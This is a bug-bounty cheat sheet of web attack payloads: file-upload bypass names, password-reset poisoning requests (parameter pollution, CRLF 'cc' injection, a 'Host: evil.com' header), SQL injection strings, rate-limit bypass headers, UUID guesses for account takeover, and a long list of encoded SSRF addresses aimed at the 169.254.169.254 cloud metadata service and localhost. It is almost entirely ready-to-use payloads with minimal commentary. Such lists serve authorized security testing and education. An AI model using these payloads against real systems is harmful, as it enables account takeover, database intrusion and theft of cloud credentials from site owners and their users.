# Bug Bounty Tips
---

## File Upload

`.htaccess`

`file.svg`

`file.SVg`

`file.png.svg`

`file.php%00.png`

`file.png' or '1'='1`

`../../file.png`

`file.'svg`

## Password Reset

```
POST /reset  
email=victim@tld.xyz&email=hacker@tld.xyz
```

```
POST /reset  
email=victim@tld.xyz&token=$BF$
```

```
POST /reset  
email=victim@tld.xyz&token=
```

```
POST /reset  
email=victim@tld.xyz&token=0000000
```

```
POST /reset  
email=victim@tld.xyz&token=nul
```

```
POST /reset  
email=victim@tld.xyz&token=nil
```

```
POST /reset  
email=victim@tld.xyz&token=HACKER-TOKEN
```

```
POST /reset  
email=victim@tld.xyz%0a%0dcc:hacker@tld.xyz
```

```
POST /reset  
email=victim@tld.xyz,hacker@tld.xyz
```

```
POST /reset  
email=victim@tld.xyz%20hacker@tld.xyz
```

```
POST /reset  
email=victim@tld.xyz|hacker@tld.xyz
```

```
POST /reset  
email=victim
```

```
POST /reset  
email=victim@tld
```

```
POST /reset  
Host: evil.com
```

```
POST /reset
{"email":["victim@tld.xyz","hacker@tld.xyz"]}
```

**Check body response for password token**

**Token generation: timestamp? userid? useremail? random?**

## SQL Injection

`/?q=1`

`/?q=1'`

`/?q=1"`

`/?q=[1]`

`/?q[]=1`

```/?q=1` ```

`/?q=1\`

`/?q=1/*'*/`

`/?q=1/*!1111'*/`

`/?q=1'||'asd'||'`

`/?q=1' or '1'='1`

`/?q=1 or 1=1`

`/?q='or''='`

```
username: '--' / "--"
password: '--' / "--"
```

## CORS

```python
if isBlocked("evil.com"):
  try("target.network")
  try("target.computer")
```

## Recon


`site:http://ideone.com | site:http://codebeautify.org | site:http://codeshare.io | site:http://codepen.io | site:http://repl.it | site:http://justpaste.it | site:http://pastebin.com | site:http://jsfiddle.net | site:http://trello.com "$TARGET"`

## File analysis

### Javascript

```
apt-get install jsbeautifier
wget https://target/app.js
js-beautify app.js > pretty.js
grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" | sort -u
```

## Rate limit bypass

```
X-Originating-IP: IP
X-Forwarded-For: IP
X-Remote-IP: IP
X-Remote-Addr: IP
X-Client-IP: IP
X-Host: IP
X-Forwared-Host: IP
```

**Increment last octate if blocked**

## Subdomain list

amass + altdns + dnsprobe + nmap

## Information disclosure

- Check if email disclosed in response after inviting a user
- Check reverse search in API
> GET /api/account?email=X

## SSRF

`site.com/?url=FUZZ`

```
http://169.254.169.254\http://0.google.com <=== PHP cve2020
https://[0:0:0:0:0:0:0:0]
https://0.0.0.0
https://[::]
https://0177.1
https://0x7f.1
http://0x7f000001
http://2130706433
http://127.000.001
https://[0:0:0:0:0:ffff:0.0.0.0]
https://[::ffff:0.0.0.0]
https://017700000001
https://[0:0:0:0:0:ffff:127.0.0.1]
https://[::ffff:127.0.0.1]/
https://[::ffff:7f00:2]
https://[::ffff:127.0.0.1]
https://[::ffff:7f00:1]
https://[0:0:0:0:0:ffff:127.0.0.2]
http://[::ffff:169.254.169.254]
http://[0:0:0:0:0:ffff:169.254.169.254]
https://[::ffff:127.0.0.2]
http://[::ffff:a9fe:a9fe]
https://0x7f.0.0.1
https://[::ffff:0:0]
http://⑯⑨。②⑤④。⑯⑨｡②⑤④/
http://⓪ⓧⓐ⑨｡⓪ⓧⓕⓔ｡⓪ⓧⓐ⑨｡⓪ⓧⓕⓔ:80/
http://⓪ⓧⓐ⑨ⓕⓔⓐ⑨ⓕⓔ:80/
http://②⑧⑤②⓪③⑨①⑥⑥:80/
http://④②⑤｡⑤①⓪｡④②⑤｡⑤①⓪:80/
http://⓪②⑤①。⓪③⑦⑥。⓪②⑤①。⓪③⑦⑥
http://169-254-169-254.nip.io
http://127.1
http://127.000000000000000.001
http://127.000.000.00000000000000001
```

## Account Takeover

UUID, 2FA, any token...

```
UUID: 0
UUID: 0000
UUID: null
UUID: nil
UUID: numerical value
UUID:
```

## Bad Practice

- Check if email links are in HTTP
- Check if old password is asked when changing password
